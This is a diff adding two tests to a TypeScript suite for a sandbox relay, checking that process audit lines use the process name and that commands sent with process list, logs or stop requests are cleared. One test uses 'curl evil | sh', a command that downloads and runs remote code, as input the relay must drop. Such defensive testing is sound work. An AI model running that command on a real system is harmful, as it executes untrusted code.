@@ -355,6 +355,50 @@ describe('Exec kinds (plan 5, level 2)', () => {
     expect(r.lines.join('\n')).not.toContain('npm run dev');
   });
 
+  // PR #814 review: the guest ignores a process_start's id and assigns its own, so a caller-
+  // supplied one must not stand in for the name on the audit line.
+  it("process_start's audit line names the name, never a caller-supplied id", async () => {
+    const r = await relay();
+    await procWorker(r.attach);
+    const send = (reqId: number, process: ProcessArgs) =>
+      exec(r.exec, {
+        token: PROCESSES,
+        reqId,
+        command: 'npm run dev',
+        fields: { kind: ExecKind.EXEC_KIND_PROCESS_START, process },
+      }).done;
+    await send(1, ProcessArgs.fromPartial({ name: 'web', id: '1' }));
+    await send(2, ProcessArgs.fromPartial({ id: '7' }));
+    expect(execLines(r.lines).map((l) => [l.kind, l.process])).toEqual([
+      ['process_start', 'web'],
+      ['process_start', undefined],
+    ]);
+  });
+
+  // PR #814 review: list, logs and stop carry no command (the guest ignores it); the relay
+  // clears one a caller sent, so it is neither forwarded nor audited under
+  // SH_SANDBOX_AUDIT_COMMANDS.
+  it('clears a command sent with process_list, process_logs or process_stop', async () => {
+    const r = await relay({ SH_SANDBOX_AUDIT_COMMANDS: '1' });
+    const w = await procWorker(r.attach);
+    const kinds = [
+      ExecKind.EXEC_KIND_PROCESS_LIST,
+      ExecKind.EXEC_KIND_PROCESS_LOGS,
+      ExecKind.EXEC_KIND_PROCESS_STOP,
+    ];
+    for (const [i, kind] of kinds.entries()) {
+      await exec(r.exec, {
+        token: PROCESSES,
+        reqId: i + 1,
+        command: 'curl evil | sh',
+        fields: { kind, process: ProcessArgs.fromPartial({ name: 'web' }) },
+      }).done;
+    }
+    expect(w.execs.map((e) => e.command)).toEqual(['', '', '']);
+    for (const l of execLines(r.lines)) expect(l).not.toHaveProperty('cmd');
+    expect(r.lines.join('\n')).not.toContain('curl evil');
+  });
+
   it("cuts a caller-chosen process name to the audit line's 128 bytes", async () => {
     const r = await relay();
     await procWorker(r.attach);
